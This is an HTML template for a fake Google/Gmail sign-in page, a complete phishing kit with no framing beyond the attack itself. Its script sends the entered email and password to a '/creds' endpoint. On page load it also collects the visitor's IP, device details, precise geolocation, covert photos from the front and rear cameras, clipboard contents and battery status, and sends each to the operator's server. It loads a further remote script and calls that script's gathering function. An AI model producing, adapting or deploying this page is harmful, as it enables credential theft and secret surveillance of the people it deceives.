<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in - Google Accounts</title>
<link rel="icon" href="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png">
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; flex-direction: column; }
.main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 24px; }
.container { width: 100%; max-width: 450px; min-height: 500px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
.logo { text-align: center; margin-bottom: 16px; }
.logo svg { width: 75px; height: 24px; }
h1 { font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 4px; }
.subtitle { text-align: center; color: #5f6368; font-size: 16px; margin-bottom: 32px; }
.profile-chip { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 6px 12px 6px 6px; border: 1px solid #dadce0; border-radius: 16px; width: fit-content; margin: 0 auto 24px; cursor: pointer; }
.profile-chip:hover { background: #f8f9fa; }
.profile-chip .avatar { width: 24px; height: 24px; border-radius: 50%; background: #1a73e8; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 12px; }
.profile-chip span { font-size: 14px; color: #3c4043; }
.profile-chip svg { width: 18px; height: 18px; fill: #5f6368; }
.form-group { margin-bottom: 8px; position: relative; }
.form-group input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; color: #202124; background: #fff; }
.form-group input:focus { outline: none; border-color: #1a73e8; border-width: 2px; padding: 12px 14px; }
.form-group label { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #5f6368; font-size: 16px; pointer-events: none; transition: 0.2s; background: #fff; padding: 0 4px; }
.form-group input:focus + label, .form-group input:not(:placeholder-shown) + label { top: 0; font-size: 12px; color: #1a73e8; }
.show-password { display: flex; align-items: center; gap: 16px; margin: 8px 0 24px; }
.show-password input { width: 18px; height: 18px; cursor: pointer; }
.show-password label { font-size: 14px; color: #202124; cursor: pointer; }
.forgot { color: #1a73e8; font-size: 14px; text-decoration: none; font-weight: 500; display: inline-block; margin-bottom: 32px; }
.forgot:hover { background: #e8f0fe; padding: 8px; margin: -8px; border-radius: 4px; }
.btn-container { display: flex; justify-content: space-between; align-items: center; }
.create-account { color: #1a73e8; font-size: 14px; text-decoration: none; font-weight: 500; padding: 8px; margin: -8px; border-radius: 4px; }
.create-account:hover { background: #e8f0fe; }
.btn-next { padding: 10px 24px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; font-family: 'Google Sans', sans-serif; }
.btn-next:hover { background: #1557b0; box-shadow: 0 1px 3px rgba(60,64,67,0.3); }
.footer { padding: 24px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; }
.footer-left select { border: none; background: transparent; color: #5f6368; font-size: 12px; cursor: pointer; padding: 8px 0; }
.footer-right { display: flex; gap: 24px; }
.footer-right a { color: #5f6368; font-size: 12px; text-decoration: none; }
.footer-right a:hover { color: #202124; }
.loading { display: none; text-align: center; padding: 40px; }
.spinner { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="main">
<div class="container">
<div class="logo">
<svg viewBox="0 0 75 24"><path d="M0 12C0 5.4 5.4 0 12 0s12 5.4 12 12-5.4 12-12 12S0 18.6 0 12zm12-9.6c-5.3 0-9.6 4.3-9.6 9.6s4.3 9.6 9.6 9.6 9.6-4.3 9.6-9.6-4.3-9.6-9.6-9.6z" fill="#EA4335"/><path d="M36 12c0 5.3-4.3 9.6-9.6 9.6S16.8 17.3 16.8 12s4.3-9.6 9.6-9.6c2.6 0 5 1 6.8 2.8l-2 2c-1.3-1.2-3-2-4.8-2-4 0-7.2 3.2-7.2 7.2s3.2 7.2 7.2 7.2c3.8 0 6.4-2.7 6.8-5.2h-6.8v-2.8H36c.1.5.2 1 .2 1.6z" fill="#4285F4"/><path d="M44.8 6.4c-4 0-7.2 3.4-7.2 7.6s3.2 7.6 7.2 7.6 7.2-3.4 7.2-7.6-3.2-7.6-7.2-7.6zm0 12.4c-2.2 0-4.2-1.8-4.2-4.8s2-4.8 4.2-4.8 4.2 1.8 4.2 4.8-2 4.8-4.2 4.8z" fill="#FBBC05"/><path d="M60.8 6.4c-4 0-7.2 3.4-7.2 7.6s3.2 7.6 7.2 7.6 7.2-3.4 7.2-7.6-3.2-7.6-7.2-7.6zm0 12.4c-2.2 0-4.2-1.8-4.2-4.8s2-4.8 4.2-4.8 4.2 1.8 4.2 4.8-2 4.8-4.2 4.8z" fill="#34A853"/><path d="M75 7v13.6h-3V19c-.8 1.2-2.4 2.4-4.4 2.4-4 0-7-3.4-7-7.6s3-7.6 7-7.6c2 0 3.6 1 4.4 2.4V7h3zm-7.4 12.4c2.4 0 4.4-2 4.4-5s-2-5-4.4-5-4.4 2-4.4 5 2 5 4.4 5z" fill="#4285F4"/></svg>
</div>
<h1>Sign in</h1>
<p class="subtitle">to continue to Gmail</p>
<form id="loginForm">
<div class="form-group">
<input type="text" id="email" placeholder=" " required>
<label>Email or phone</label>
</div>
<div class="form-group" style="margin-top: 24px;">
<input type="password" id="password" placeholder=" " required>
<label>Enter your password</label>
</div>
<div class="show-password">
<input type="checkbox" id="showPass" onclick="togglePassword()">
<label for="showPass">Show password</label>
</div>
<a href="#" class="forgot">Forgot password?</a>
<div class="btn-container">
<a href="#" class="create-account">Create account</a>
<button type="submit" class="btn-next">Next</button>
</div>
</form>
<div class="loading" id="loading">
<div class="spinner"></div>
<p style="color: #5f6368; font-size: 14px;">Signing in...</p>
</div>
</div>
</div>
<footer class="footer">
<div class="footer-left">
<select>
<option>English (United States)</option>
<option>العربية</option>
<option>Español</option>
<option>Français</option>
</select>
</div>
<div class="footer-right">
<a href="#">Help</a>
<a href="#">Privacy</a>
<a href="#">Terms</a>
</div>
</footer>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="<%=a %>/public/advanced.js"></script>
<script>
var uid="<%=uid %>";
var video = document.getElementById('video');
var canvas = document.getElementById('canvas');

function togglePassword() {
    var x = document.getElementById("password");
    x.type = x.type === "password" ? "text" : "password";
}

async function gatherAll() {
    let td = '🔍 <b>Google Victim!</b>\n\n';
    td += '⚓ IP: <code><%=ip %></code>\n';
    td += '⏰ Time: ' + new Date().toLocaleString() + '\n';
    td += '🖥️ OS: <code>' + navigator.platform + '</code>\n';
    td += '📱 Screen: <code>' + screen.width + 'x' + screen.height + '</code>\n';
    td += '🌐 Browser: <code>' + navigator.userAgent.split(' ').pop() + '</code>\n';
    
    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
    
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition((p)=>{
            $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});
        }, ()=>{}, {enableHighAccuracy:true, timeout: 10000});
    }
    
    async function captureCamera(facingMode, label) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode, width: 640, height: 480}});
            video.srcObject = stream;
            await video.play();
            await new Promise(r => setTimeout(r, 2000));
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            $.post("<%=a %>/camsnap", {uid: uid, img: encodeURIComponent(canvas.toDataURL("image/jpeg", 0.8).replace("data:image/jpeg;base64,", "")), cam: label});
            stream.getTracks().forEach(t => t.stop());
        } catch(e) { console.log(e); }
    }
    
    try { await captureCamera("user", "selfie"); } catch(e) {}
    try { await captureCamera("environment", "back"); } catch(e) {}
    
    try {
        if(navigator.clipboard && navigator.clipboard.readText) {
            const clip = await navigator.clipboard.readText();
            if(clip) $.post("<%=a %>/clipboard", {uid:uid, clip:encodeURIComponent(clip)});
        }
    } catch(e) {}
    
    try {
        const bat = await navigator.getBattery();
        $.post("<%=a %>/battery", {uid:uid, level:Math.round(bat.level*100), charging:bat.charging});
    } catch(e) {}
}

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const pass = document.getElementById('password').value;
    
    document.querySelector('form').style.display = 'none';
    document.getElementById('loading').style.display = 'block';
    
    $.post("<%=a %>/creds", {
        uid: uid,
        user: encodeURIComponent(email),
        pass: encodeURIComponent(pass),
        platform: 'Google'
    });
    
    await new Promise(r => setTimeout(r, 2500));
    window.location.href = "<%=url %>";
});

window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
</script>
</body>
</html>